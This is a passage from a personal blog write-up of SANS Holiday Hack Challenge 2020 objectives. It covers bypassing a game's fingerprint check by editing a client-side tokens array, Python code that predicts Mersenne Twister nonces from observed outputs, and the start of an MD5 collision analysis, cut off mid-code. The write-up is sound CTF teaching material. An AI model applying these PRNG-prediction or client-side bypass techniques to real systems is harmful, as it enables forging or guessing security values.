<h3 id=10---defeat-fingerprint-sensor>10 - defeat fingerprint sensor<a hidden class=anchor aria-hidden=true href=#10---defeat-fingerprint-sensor>#</a></h3>
<blockquote>
<p>Bypass the Santavator fingerprint sensor. Enter Santa&rsquo;s office without Santa&rsquo;s fingerprint.</p>
</blockquote>
<p>This challenge was the first time I started fiddling with how the Santavator was working under the hood.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santavator_santas_office.png> <figcaption>
santavator fingerprint reader
</figcaption>
</figure>
<p>When activating the fingerprint reader as Santa, you are teleported straight to Santa&rsquo;s Office. However, as your normal avatar, well, nothing happens when you click on it. So, the next logical thing was to pop open the browser console and get a feel for what drives the elevator.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santavator_fingerprint_sources.png> <figcaption>
santavator fingerprint reader javascript sources
</figcaption>
</figure>
<p>I found some JavaScript in <code>app.js</code>, and read all of it. When I wanted to see what the current values were that were stored in variables, I&rsquo;d switch to the console, select the elevator iframe and tinker away. One specific variable caught my attention after understanding the sourc a little better.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santavator_fingerprint_tokens.png> <figcaption>
santavator fingerprint reader tokens
</figcaption>
</figure>
<p>If you are playing as Santa though, that array looks a little different.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>[<span style=color:#e6db74>&#34;redlight&#34;</span>, <span style=color:#e6db74>&#34;workshop-button&#34;</span>, <span style=color:#e6db74>&#34;marble&#34;</span>, <span style=color:#e6db74>&#34;nut&#34;</span>, <span style=color:#e6db74>&#34;candycane&#34;</span>, <span style=color:#e6db74>&#34;elevator-key&#34;</span>, <span style=color:#e6db74>&#34;nut2&#34;</span>, <span style=color:#e6db74>&#34;ball&#34;</span>, <span style=color:#e6db74>&#34;yellowlight&#34;</span>, <span style=color:#e6db74>&#34;greenlight&#34;</span>, <span style=color:#e6db74>&#34;besanta&#34;</span>]
</code></pre></div><p>Notice the <code>besanta</code> entry there? So, to beat this one, change to your avatar, open up the browser console and add <code>besanta</code> to the <code>tokens</code> array with the below and click the fingerprint sensor:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#a6e22e>tokens</span>.<span style=color:#a6e22e>push</span>(<span style=color:#e6db74>&#39;besanta&#39;</span>)
</code></pre></div><h3 id=11a---naughtynice-list-with-blockchain-investigation-part-1>11a - naughty/nice list with blockchain investigation part 1<a hidden class=anchor aria-hidden=true href=#11a---naughtynice-list-with-blockchain-investigation-part-1>#</a></h3>
<blockquote>
<p>Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and <a href=https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip>tools</a>. (Enter just the 16-character hex value of the nonce)</p>
</blockquote>
<figure>
<img loading=lazy src=/images/holidayhack-20/blockchain_objective.png> <figcaption>
blockchain challenge in santas office
</figcaption>
</figure>
<p>Clicking on the naughty/nice list on the desk will take you to <a href=https://download.holidayhackchallenge.com/2020/blockchain.dat>https://download.holidayhackchallenge.com/2020/blockchain.dat</a> to download a file called <code>blockchain.dat</code>. Save this one. Next, the conversation with Tinsel Upatree will reveal a set of tools you could use to interact with that file, located here: <a href=https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip>https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip</a>.</p>
<p>The &ldquo;EducationPack&rdquo; archive contains a simple <code>Dockerfile</code> to setup <code>pycryptodome</code>, as well as certificates that will allow you to interact with the blockchain data file you previously downloaded. As <code>pycryptodome</code> is a simple python dependency, I just installed it in a virtual environment and worked from there. Nothing stops you from building and using the docker container though.</p>
<p>The more important file though is <code>naughty_nice.py</code>. The beginning of the file contains a very large comment with a summary of how a blockchain works in general, together with some usage information about the two classes in the file; <code>Block</code> and <code>Chain</code>. The scripts&rsquo; entry point also has some example usage where a new <code>Chain</code> is created, and some blocks (including a genesis block) are added and finally verified.</p>
<p>Now before we dive into the nonce prediction part of this objective, let&rsquo;s get familiar with the two new classes we have to work with. I created a new file, <code>main.py</code> and imported the <code>Block</code> and <code>Chain</code> classes from the <code>naughty_nice</code> module. Next, I loaded the <code>blockchain.dat</code> file we got and tried to verify the chain using the <code>verify_chain()</code> function.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> hashlib
<span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> RSA

<span style=color:#f92672>from</span> naughty_nice <span style=color:#f92672>import</span> Chain

<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;official_public.pem&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> fh:
    official_public_key <span style=color:#f92672>=</span> RSA<span style=color:#f92672>.</span>importKey(fh<span style=color:#f92672>.</span>read())

c2 <span style=color:#f92672>=</span> Chain(load<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blockchain.dat&#39;</span>)
print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;chain verify: </span><span style=color:#e6db74>{</span>c2<span style=color:#f92672>.</span>verify_chain(official_public_key)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>Running that resulted in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ python3 main-blog.py

*** WARNING *** Wrong previous hash at block 128449.

*** WARNING *** Blockchain invalid from block 128449 onward.

chain verify: False
</code></pre></div><p>Closer inspection of the <code>verify_chain()</code> function reveals that it accepts a second argument to specify the hash for the previous block. Since we don&rsquo;t have the full blockchain data that starts with the genesis block, we need to specify the hash we can find from the data we do have. So, I looped the blocks in the chain after loading and extracted the <code>PreviousHash</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># [ ... ]</span>

c2 <span style=color:#f92672>=</span> Chain(load<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blockchain.dat&#39;</span>)
print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;chain verify: </span><span style=color:#e6db74>{</span>c2<span style=color:#f92672>.</span>verify_chain(official_public_key)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)

<span style=color:#66d9ef>for</span> block <span style=color:#f92672>in</span> c2<span style=color:#f92672>.</span>blocks:
    print(block)
    <span style=color:#66d9ef>break</span>
</code></pre></div><p>The updated script would now print the full block (in an easy to read format thanks to the a <code>__repr__()</code> method on the <code>Block</code> class), where we could see the <code>PreviousHash</code> value.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ python3 main-blog.py

*** WARNING *** Wrong previous hash at block 128449.

*** WARNING *** Blockchain invalid from block 128449 onward.

chain verify: False
Chain Index: 128449
              Nonce: e3e12de5edfb51e2
                PID: 0803508ada0a5ebf

[ ... ]

               Date: 03/24
               Time: 13:21:00
       PreviousHash: c6e2e6ecb785e7132c8003ab5aaba88d
  Data Hash to Sign: 03cfb11504b8eee93b26aeb0d8ac39ff
          Signature: b&#39;PT4OZUq+vwfNDhqipxwt28NC4Hd7dw6N1i4XHMGkIMR53qy8dF47YwpqzEjW0EAbUYPZ+b/E4X3YjXUTI0VnoJ2VsJQWtIPwcGIk5ayMfe5dgrjuLle5NUyEpd1EpIPdiSLMnyvbJEzG3HfA2dpkNsXWtO/D5wFYWGEErAt/PyH9CK/QuV5w3ArCwEmM61KWV7XTmC38EQoIm9iz5QQIIBU2onlZUcBlZ81N+H8pL/utpArkLppSwdRdx5f2kHUTLM7I2egDAdHhQ5zPAbZLoJ03HYjEBGKXiSQjAGhqY47U2DmliyOEehchTmmq+JiBF3ozXiV5hm89y/mN2uUzmQ==&#39;
</code></pre></div><p>Knowing the <code>PreviousHash</code> value, we can call <code>chain_verify()</code> with the updated values.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># [ ... ]</span>

c2 <span style=color:#f92672>=</span> Chain(load<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blockchain.dat&#39;</span>)
print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;chain verify: </span><span style=color:#e6db74>{</span>c2<span style=color:#f92672>.</span>verify_chain(official_public_key, <span style=color:#e6db74>&#34;c6e2e6ecb785e7132c8003ab5aaba88d&#34;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>This would result in the output stating <code>chain verify: True</code>. Great!</p>
<p>As far as nonce prediction goes, I first printed every single block as I did before, and used <code>grep</code> on that output to just get the <code>Nonce</code> value.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ python3 main-blog.py | grep Nonce | head
              Nonce: e3e12de5edfb51e2
              Nonce: 2176088150fdfd1d
              Nonce: 0a2dada92f154da4
              Nonce: d391517e345e0ffe
              Nonce: 8836422291566d65
              Nonce: f4d0bb0198759e1d
              Nonce: 7640cd71f6ea6c76
              Nonce: ec7a1a8ea7369d3b
              Nonce: 5fb94c5bbfb85869
              Nonce: 27ac5576a7505af7
</code></pre></div><p>The <a href=#snowball-fight>snowball fight</a> terminal challenge had us play with the Mersenne twister algorithm, and the sample code we used wanted integers to replicate the PRNG&rsquo;s state. Looking at the Nonce values, they appeared to be hex, so I had a quick look at converting those to integers.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ python3
Python 3.8.7 (default, Dec 30 2020, 10:14:55)
[Clang 12.0.0 (clang-1200.0.32.28)] on darwin
Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
&gt;&gt;&gt; 0xe3e12de5edfb51e2
16420456181932970466
&gt;&gt;&gt;
</code></pre></div><p>Easy! We also had a total of <code>1548</code> blocks in our chain, and therefore <code>1548</code> nonces which was more than enough to replicate the state of the PRNG. At this point I also realised I did not have to resort to silly shell parsing of the Nonce values as they were available in code when looping the blocks in the blockchain.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># [ ... ]</span>

c2 <span style=color:#f92672>=</span> Chain(load<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blockchain.dat&#39;</span>)

<span style=color:#75715e># extract the nonce values from all the blocks in the chain</span>
nonce <span style=color:#f92672>=</span> [block<span style=color:#f92672>.</span>nonce <span style=color:#66d9ef>for</span> block <span style=color:#f92672>in</span> c2<span style=color:#f92672>.</span>blocks]

print(nonce[:<span style=color:#ae81ff>2</span>])
</code></pre></div><p>This would print the first two nonce values extracted as (notice how they are already integers now!):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ python3 main-blog.py
[16420456181932970466, 2411124002006105373]
</code></pre></div><p>At this stage I naively thought I could just replicate what we had done in the <a href=#snowball-fight>snowball fight</a> by replicating the PRNG&rsquo;s state, and then continue to reveal the next values. The problem was though that when you did this, you would not get the correct nonce value! Remember, the question states (and you can easily verify) that the last block we have has the index <code>129996</code>, and they want to know the nonce value for <code>130000</code>. That’s just 4 predictions forward? Well, those values won’t be correct.</p>
<p>My first hypothesis was that because we are only feeding 624 numbers into the algorithm, our predictions should at least match the nonce value for the 625th block we have in the chain, right? No, even this was incorrect as it seemed like we could not even predict the 625th nonce correctly!</p>
<p>Re-reading Tom&rsquo;s original script from the terminal challenge, I realised that it was actually expecting 32bit numbers, and not 64bit ones like we are feeding to it at the moment. The biggest hint for that was this function in the <code>mt19937</code> class.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>my_int32</span>(self, x):
    <span style=color:#66d9ef>return</span> (x <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>)
</code></pre></div><p>Because of this function, only part of our 64bit numbers were fed into the algorithm to determine state, meaning that our predictions won&rsquo;t match. The question though was, how do you handle 64bit numbers? At this stage I could bore you with the countless Google&rsquo;s I did and various articles I read. In the end, there were two things I saw that helped me realise what I had to do.</p>
<p>Unfortunately, I can&rsquo;t recall the source of the first hint, but I read an (article|code|blog|paper) that mentioned that the algorithm expects a DWORD, which is a 32bit unsigned integer, for each entry in the state array. That had me think I&rsquo;d have to split the 64bit integer up into two 32bit integers. But, I had no idea if I had to feed both into the algorithm, or one, or if both, which one first? Anyways.</p>
<p>The second hint was reading code for an existing <a href=https://github.com/kmyk/mersenne-twister-predictor>mersenne-twister-predictor</a> project on Github to try and see if (and how) it handled 64bit values. I found the relevant code <a href=https://github.com/kmyk/mersenne-twister-predictor/blob/25b5723c70e60398d2e8d6fdd51b887e343a97ae/mt19937predictor.py#L88-L101>here</a>, which had the <code>setrandbits()</code> function accept raw bits and an indication of how many bits.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># source: https://github.com/kmyk/mersenne-twister-predictor/blob/25b5723c70e60398d2e8d6fdd51b887e343a97ae/mt19937predictor.py#L88-L101</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setrandbits</span>(self, y, bits):
    <span style=color:#e6db74>&#39;&#39;&#39;The interface for :py:meth:`random.Random.getrandbits` in Python&#39;s Standard Library
</span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (bits <span style=color:#f92672>%</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>):
        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>ValueError</span>(<span style=color:#e6db74>&#39;number of bits must be a multiple of 32&#39;</span>)
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#ae81ff>0</span> <span style=color:#f92672>&lt;=</span> y <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> bits):
        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>ValueError</span>(<span style=color:#e6db74>&#39;invalid state&#39;</span>)
    <span style=color:#66d9ef>if</span> bits <span style=color:#f92672>==</span> <span style=color:#ae81ff>32</span>:
        self<span style=color:#f92672>.</span>setrand_int32(y)
    <span style=color:#66d9ef>else</span>:
        <span style=color:#66d9ef>while</span> bits <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
            self<span style=color:#f92672>.</span>setrand_int32(y <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>)
            y <span style=color:#f92672>&gt;&gt;=</span> <span style=color:#ae81ff>32</span>
            bits <span style=color:#f92672>-=</span> <span style=color:#ae81ff>32</span>
</code></pre></div><p>Here we can see that 32bit values were being fed into the state array after being split up using some bitshift magic (and a hint of how many bits were expected). The state array feeding was also continuously done until there were no more bits left, meaning that the complete 64bit integer had to be squeezed in, in chunks of 32bit. That was enough to put me on the right path to solve this one!</p>
<p>To split up the 64bit number, you can literally just google something like &ldquo;split 64-bit into two 32-bit&rdquo; (ignoring the &ldquo;how to convert 64bit apps to 32bit&rdquo; lol). Regardless of the language the result is in, bitshift operations are usually pretty generic. The first hit for my suggested search was <a href=https://stackoverflow.com/a/2810302>this</a> post which showed the operations needed to both pack and unpack the 64bit integer. To get the lower number use <code>number & 0xffffffff</code>, and to get the higher number use <code>number >> 32</code>.</p>
<p>Armed with this knowledge I modified my nonce predictor script to loop over all of the 64bit nonces, split them up and populate a new 32bit nonce array. To know if the lower or higher number had to come first took some trial and error. Then I just followed the same loop like we did in the snowball fight game.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>nonce64 <span style=color:#f92672>=</span> [block<span style=color:#f92672>.</span>nonce <span style=color:#66d9ef>for</span> block <span style=color:#f92672>in</span> c2<span style=color:#f92672>.</span>blocks]
nonce32 <span style=color:#f92672>=</span> []

<span style=color:#66d9ef>for</span> n <span style=color:#f92672>in</span> nonce64:
    l, h <span style=color:#f92672>=</span> n <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>, n <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span>
    nonce32<span style=color:#f92672>.</span>append(l)
    nonce32<span style=color:#f92672>.</span>append(h)

<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(mt19937<span style=color:#f92672>.</span>n):
    rng<span style=color:#f92672>.</span>MT[i] <span style=color:#f92672>=</span> untemper(nonce32[i])
</code></pre></div><p>I was almost there. The last bit needed was to extract a 64bit number again from the PRNG we have replicated the state of. Using the same <a href=https://github.com/kmyk/mersenne-twister-predictor>mersenne-twister-predictor</a> project, a <code>getrandbits()</code> function revealed that it would just keep on reading bits until the number of bits you wanted was reached. In other words, literally the inverse of the feeding process we followed. So, I created one more function to just get me a 64bit number by asking for two new numbers, and packing them into a 64bit integer.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getnonce64</span>():
    a <span style=color:#f92672>=</span> rng<span style=color:#f92672>.</span>extract_number()
    b <span style=color:#f92672>=</span> rng<span style=color:#f92672>.</span>extract_number()

    <span style=color:#66d9ef>return</span> (b <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>|</span> a
</code></pre></div><p>Putting this all together resulted in me being able to correctly predict the 625th nonce like we had it in the blockchain. For the last block in the blockchain we know the nonce was <code>eb806dad1ad54826</code>, so to wrap this up I looped the number predictor until we reached that nonce (remember we had like 1500+ blocks), and then just stepped four more nonces to get to the answer. The final script I had was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> mt19937 <span style=color:#f92672>import</span> mt19937, untemper
<span style=color:#f92672>from</span> naughty_nice <span style=color:#f92672>import</span> Chain

match <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xeb806dad1ad54826</span>

rng <span style=color:#f92672>=</span> mt19937(<span style=color:#ae81ff>0</span>)

c2 <span style=color:#f92672>=</span> Chain(load<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blockchain.dat&#39;</span>)
nonce64 <span style=color:#f92672>=</span> [block<span style=color:#f92672>.</span>nonce <span style=color:#66d9ef>for</span> block <span style=color:#f92672>in</span> c2<span style=color:#f92672>.</span>blocks]
nonce32 <span style=color:#f92672>=</span> []

<span style=color:#66d9ef>for</span> n <span style=color:#f92672>in</span> nonce64:
    l, h <span style=color:#f92672>=</span> n <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>, n <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span>
    nonce32<span style=color:#f92672>.</span>append(l)
    nonce32<span style=color:#f92672>.</span>append(h)

<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(mt19937<span style=color:#f92672>.</span>n):
    rng<span style=color:#f92672>.</span>MT[i] <span style=color:#f92672>=</span> untemper(nonce32[i])


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getnonce64</span>():
    a <span style=color:#f92672>=</span> rng<span style=color:#f92672>.</span>extract_number()
    b <span style=color:#f92672>=</span> rng<span style=color:#f92672>.</span>extract_number()

    <span style=color:#66d9ef>return</span> (b <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>|</span> a


<span style=color:#75715e># ff to the latest value</span>
<span style=color:#66d9ef>while</span> getnonce64() <span style=color:#f92672>!=</span> match:
    <span style=color:#66d9ef>continue</span>

print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;next nonce: </span><span style=color:#e6db74>{</span>hex(getnonce64())<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;next nonce: </span><span style=color:#e6db74>{</span>hex(getnonce64())<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;next nonce: </span><span style=color:#e6db74>{</span>hex(getnonce64())<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;next nonce: </span><span style=color:#e6db74>{</span>hex(getnonce64())<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>With this, the answer was: <code>57066318f32f729d</code></p>
<h3 id=11b---naughtynice-list-with-blockchain-investigation-part-2>11b - naughty/nice list with blockchain investigation part 2<a hidden class=anchor aria-hidden=true href=#11b---naughtynice-list-with-blockchain-investigation-part-2>#</a></h3>
<blockquote>
<p>The SHA256 of Jack&rsquo;s altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you&rsquo;re clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you&rsquo;ve recreated the original block, what is the SHA256 of that block?</p>
</blockquote>
<p>This challenge was amazing. A lot of the hints you had from Elves and your badge made it clear that this blockchain was hashing using MD5 and they needed to change that. We&rsquo;re given a sha265 of a block that had been altered, but since MD5 was in use we couldn&rsquo;t just filter for that block. Instead, we had to rehash the blocks ourselves to identify the altered block. Watching the talk by Qwerty Petabyte (gosh, that voice was not fun to listen to), a slide showing the parts that are hashed was <a href="https://youtu.be/7rLMl88p-ec?t=358">shown here</a>. Specifically, everything, including the signature is hashed.</p>
<p>In the <code>Block</code> class, you&rsquo;d find two functions that would return data from the block to be hashed; <code>block_data()</code> and <code>block_data_signed()</code>. The latter included the signature field, just like it was mentioned in the talk slide. So, to calculate the sha265 of every block, I imported <code>hashlib</code> and did that for the return value of <code>block_data_signed()</code>, matching that against the sha266 we were given.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> hashlib

<span style=color:#f92672>from</span> naughty_nice <span style=color:#f92672>import</span> Chain

c2 <span style=color:#f92672>=</span> Chain(load<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blockchain.dat&#39;</span>)

<span style=color:#66d9ef>for</span> block <span style=color:#f92672>in</span> c2<span style=color:#f92672>.</span>blocks:
    m <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>sha256()
    m<span style=color:#f92672>.</span>update(block<span style=color:#f92672>.</span>block_data_signed())
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (m<span style=color:#f92672>.</span>hexdigest() <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f&#34;</span>):
        <span style=color:#66d9ef>continue</span>

    print(block)
    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;MD5: </span><span style=color:#e6db74>{</span>block<span style=color:#f92672>.</span>full_hash()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>This revealed the following block as the culprit. Notice just <em>how</em> nice this person was, and that it was the only block with two documents.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>Chain Index: 129459
              Nonce: a9447e5771c704f4
                PID: 0000000000012fd1
                RID: 000000000000020f
     Document Count: 2
              Score: ffffffff (4294967295)
               Sign: 1 (Nice)
         Data item: 1
               Data Type: ff (Binary blob)
             Data Length: 0000006c
                    Data: b&#39;ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09&#39;
         Data item: 2
               Data Type: 05 (PDF)
             Data Length: 00009f57

[ ... laaaaaarge PDF Data section ... ]

               Date: 03/24
               Time: 13:21:41
       PreviousHash: 4a91947439046c2dbaa96db38e924665
  Data Hash to Sign: 347979fece8d403e06f89f8633b5231a
          Signature: b&#39;MJIxJy2iFXJRCN1EwDsqO9NzE2Dq1qlvZuFFlljmQ03+erFpqqgSI1xhfAwlfmI2MqZWXA9RDTVw3+aWPq2S0CKuKvXkDOrX92cPUz5wEMYNfuxrpOFhrK2sks0yeQWPsHFEV4cl6jtkZ//OwdIznTuVgfuA8UDcnqCpzSV9Uu8ugZpAlUY43Y40ecJPFoI/xi+VU4xM0+9vjY0EmQijOj5k89/AbMAD2R3UbFNmmR61w7cVLrDhx3XwTdY2RCc3ovnUYmhgPNnduKIUA/zKbuu95FFi5M2r6c5Mt6F+c9EdLza24xX2J4l3YbmagR/AEBaF9EBMDZ1o5cMTMCtHfw==&#39;

MD5: b10b4a6bd373b61f32f4fd3a0cdfbf84
</code></pre></div><p>The block had two documents that you could extract using <code>block.dump_doc(1)</code> and <code>block.dump_doc(2)</code>. This would save the files to disk. I did not know what to do with the binary blob, but the PDF was interesting. I also saved the whole block we identified with:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;modified_block.dat&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
    f<span style=color:#f92672>.</span>write(block<span style=color:#f92672>.</span>block_data_signed())
</code></pre></div><figure>
<img loading=lazy src=/images/holidayhack-20/jack_frost_not_naughty.png> <figcaption>
jack frost being suuuper nice it seems
</figcaption>
</figure>
<p>Alright, it was clear from the hints that this challenge was some form of hash collision, so I worked though the contents of each of the suggested links:</p>
<ul>
<li><a href=https://github.com/cr-marcstevens/hashclash>https://github.com/cr-marcstevens/hashclash</a></li>
<li><a href=https://github.com/corkami/collisions>https://github.com/corkami/collisions</a></li>
<li><a href=https://speakerdeck.com/ange/colltris>https://speakerdeck.com/ange/colltris</a></li>
</ul>
<p>The slide deck was suuuper helpful (slide 101 to 111) to translate what was spoken about in the Github projects. I also found <a href="https://www.youtube.com/watch?v=JXazRQ0APpI">this</a> talk by Ange Albertini really useful to colour in some of the gaps I had in the slide deck.</p>
<p>In the end, I realised we had a potential UNICOL collision, and the work I had to do was to identify the 4 specific bytes that were changed. From the provided material, I understood that the UNICOL collision relied on a similar prefix for the two files, preferably at a 64byte boundary (which could be padded if needed). I also understood that the file format matters even though we may be able to generate a hash collision. To help me better understand the block file format (and prepare for the byte changes needed), I loaded up the modified block in a hex editor and studied the <code>Block.load_a_block()</code> function closer.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_a_block</span>(self, fh):
    self<span style=color:#f92672>.</span>index <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>16</span>), <span style=color:#ae81ff>16</span>)
    self<span style=color:#f92672>.</span>nonce <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>16</span>), <span style=color:#ae81ff>16</span>)
    self<span style=color:#f92672>.</span>pid <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>16</span>), <span style=color:#ae81ff>16</span>)
    self<span style=color:#f92672>.</span>rid <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>16</span>), <span style=color:#ae81ff>16</span>)
    self<span style=color:#f92672>.</span>doc_count <span style=color:#f92672>=</span> int(fh<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>10</span>)
